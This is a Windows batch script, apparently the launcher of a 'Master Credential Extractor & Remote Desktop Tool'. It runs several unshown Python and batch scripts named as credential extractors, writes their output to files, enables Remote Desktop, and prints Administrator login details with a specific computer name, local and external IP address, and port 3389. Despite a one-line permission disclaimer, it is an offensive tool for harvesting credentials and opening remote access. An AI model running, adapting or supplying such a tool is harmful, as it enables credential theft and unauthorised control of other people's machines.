@echo off
echo ========================================
echo MASTER CREDENTIAL EXTRACTOR & REMOTE DESKTOP TOOL
echo ========================================
echo.
echo This will run ALL tools and create separate output files
echo.
echo WARNING: This tool extracts sensitive credentials from your system.
echo Only use this tool on systems you own and have permission to access.
echo.
pause

echo ========================================
echo STEP 1: INSTALLING DEPENDENCIES
echo ========================================
echo Installing all required libraries...
call install.bat
echo.

echo ========================================
echo STEP 2: RUNNING ALL PYTHON TOOLS
echo ========================================
echo.


echo Running Ultimate Credential Extractor (ultimate.py)...
echo Output will be saved to output1.txt
python ultimate.py > output1.txt 2>&1
if %errorlevel% equ 0 (
    echo ✓ Ultimate extractor completed successfully
) else (
    echo ✗ Ultimate extractor failed
)
echo.

echo Running Aggressive Credential Extractor (aggressive.py)...
echo Output will be saved to output2.txt
python aggressive.py > output2.txt 2>&1
if %errorlevel% equ 0 (
    echo ✓ Aggressive extractor completed successfully
) else (
    echo ✗ Aggressive extractor failed
)
echo.

echo Running Remote Desktop Configuration (remote.py)...
echo Output will be saved to output3.txt
python remote.py > output3.txt 2>&1
if %errorlevel% equ 0 (
    echo ✓ Remote desktop configuration completed successfully
) else (
    echo ✗ Remote desktop configuration failed
)
echo.

echo ========================================
echo STEP 3: RUNNING BATCH FILES
echo ========================================
echo.

echo Running Remote Desktop Enablement (remote.bat)...
echo This requires administrator privileges
echo Output will be saved to batch_output1.txt
call remote.bat > batch_output1.txt 2>&1
if %errorlevel% equ 0 (
    echo ✓ Remote desktop enablement completed successfully
) else (
    echo ✗ Remote desktop enablement failed (may need admin privileges)
)
echo.

echo Running Ultimate Batch (ultimate.bat)...
echo Output will be saved to batch_output2.txt
call ultimate.bat > batch_output2.txt 2>&1
if %errorlevel% equ 0 (
    echo ✓ Ultimate batch completed successfully
) else (
    echo ✗ Ultimate batch failed
)
echo.

echo ========================================
echo STEP 4: GENERATING SUMMARY REPORT
echo ========================================
echo.

echo Creating summary report...
echo SUMMARY REPORT > summary.txt
echo =============== >> summary.txt
echo Generated: %date% %time% >> summary.txt
echo. >> summary.txt
echo PYTHON TOOLS EXECUTED: >> summary.txt
echo - ultimate.py (Ultimate Credential Extractor) >> summary.txt
echo - aggressive.py (Aggressive Credential Extractor) >> summary.txt
echo - remote.py (Remote Desktop Configuration) >> summary.txt
echo. >> summary.txt
echo BATCH FILES EXECUTED: >> summary.txt
echo - install.bat (Dependency Installation) >> summary.txt
echo - remote.bat (Remote Desktop Enablement) >> summary.txt
echo - ultimate.bat (Ultimate Tool Runner) >> summary.txt
echo. >> summary.txt
echo OUTPUT FILES CREATED: >> summary.txt
echo - output1.txt (Ultimate extractor results) >> summary.txt
echo - output2.txt (Aggressive extractor results) >> summary.txt
echo - output3.txt (Remote desktop configuration) >> summary.txt
echo - batch_output1.txt (Remote desktop enablement) >> summary.txt
echo - batch_output2.txt (Ultimate batch results) >> summary.txt
echo - summary.txt (This summary report) >> summary.txt
echo. >> summary.txt
echo IMPORTANT SECURITY NOTES: >> summary.txt
echo - All output files contain sensitive information >> summary.txt
echo - Store them securely and delete when no longer needed >> summary.txt
echo - Do not share these files with unauthorized parties >> summary.txt
echo - Remote desktop is now configured on this PC >> summary.txt
echo. >> summary.txt
echo CONNECTION INFORMATION: >> summary.txt
echo - Username: Administrator >> summary.txt
echo - Computer Name: DESKTOP-IG9R1CC >> summary.txt
echo - Local IP: 192.168.174.128 >> summary.txt
echo - External IP: 70.39.70.194 >> summary.txt
echo - Port: 3389 >> summary.txt
echo. >> summary.txt
echo =============== >> summary.txt
echo END OF SUMMARY >> summary.txt

echo ✓ Summary report created: summary.txt
echo.

echo ========================================
echo ALL TOOLS EXECUTION COMPLETED!
echo ========================================
echo.
echo OUTPUT FILES CREATED:
echo - output1.txt (Ultimate credential extractor)
echo - output2.txt (Aggressive credential extractor)
echo - output3.txt (Remote desktop configuration)
echo - batch_output1.txt (Remote desktop enablement)
echo - batch_output2.txt (Ultimate batch results)
echo - summary.txt (Summary report)
echo.
echo IMPORTANT SECURITY NOTES:
echo - All output files contain sensitive information
echo - Store them securely and delete when no longer needed
echo - Do not share these files with unauthorized parties
echo.
echo REMOTE DESKTOP CONNECTION:
echo - Username: Administrator
echo - Computer Name: DESKTOP-IG9R1CC
echo - Local IP: 192.168.174.128
echo - External IP: 70.39.70.194
echo - Port: 3389
echo.
echo To connect remotely:
echo 1. Open Remote Desktop Connection (mstsc)
echo 2. Enter IP: 192.168.174.128 (local) or 70.39.70.194 (external)
echo 3. Username: Administrator
echo 4. Enter your password
echo 5. Click Connect
echo.
echo All tools have been executed successfully!
echo.
pause
